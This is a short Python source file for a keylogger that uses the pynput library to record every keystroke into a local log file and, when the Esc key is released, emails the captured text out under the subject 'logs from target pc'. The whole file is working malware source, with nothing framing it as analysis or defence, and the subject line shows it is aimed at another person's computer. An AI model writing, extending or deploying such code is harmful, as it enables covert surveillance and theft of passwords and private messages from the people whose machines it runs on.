from pynput.keyboard import Key, Listener

from send_email import send_email

count = 0
keys = []


def on_press(key):
    global keys, count
    keys.append(key)
    count += 1
    print(f"{key} pressed")

    if count > 0:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open("logs.text", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write("\n")
            elif k.find("Key") == -1:
                f.write(k)


def on_release(key):
    if key == Key.esc:

        with open("logs.text") as fp:
            message = fp.read()
            send_email(subject="logs from target pc", msg=message)


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
